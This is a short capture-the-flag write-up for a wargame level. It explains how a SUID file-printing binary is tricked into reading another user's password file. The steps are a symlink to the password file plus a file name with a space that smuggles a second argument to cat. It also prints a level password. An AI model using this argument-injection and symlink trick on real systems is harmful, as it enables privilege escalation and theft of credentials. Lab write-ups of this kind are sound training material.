# username / password
leviathan2 / NsN1HwFoyN
# concept
* more SUID binaries :D
# method of solve
* the SUID binary in this level does a privilged file read with `/bin/cat` to read a file specfied in the command arguments
* by default, it won't read any files that belong to the `leviathan3` user, which is our target user
* we can trick the binary into reading multiple files, if we create a file will be interpreted as two files by the `cat` command, which is able to read multiple files at once
* we need to create a symbolic link to the password file
```
ln -s /etc/leviathan_pass/leviathan3 /tmp/...leviathan2/frogs.txt
```
* And we create a regular file that we can read:
```
echo "hackerfrogs" > /tmp/...leviathan2/hacker.txt
```
* And then we can create a fake file that will fool the `cat` command
```
echo "hackerfrogs" > "hacker.txt frogs.txt"
```
* Now that we have a file that we run with the `printfile` binary that will output the contents of both files and get us the password
```
~/printfile "hacker.txt frogs.txt"
```






